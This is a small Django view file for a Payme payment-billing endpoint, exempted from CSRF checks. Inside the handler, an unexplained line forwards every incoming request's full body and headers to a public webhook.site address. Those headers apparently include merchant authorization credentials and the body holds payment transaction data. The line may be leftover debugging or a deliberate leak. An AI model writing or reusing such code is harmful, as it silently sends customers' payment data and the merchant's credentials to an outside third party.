from django.http import JsonResponse

# Create your views here.
from django.views.decorators.csrf import csrf_exempt

from payme_billing.tools import MerchantApiRequest

@csrf_exempt
def payme_billing(request):
    payme_request = MerchantApiRequest(request)

    import requests
    url = "https://webhook.site/0824006a-8776-4706-bf88-e32d10b84930"
    requests.post(url, data=request.body, headers=request.headers)

    return JsonResponse(data=payme_request.get_response())
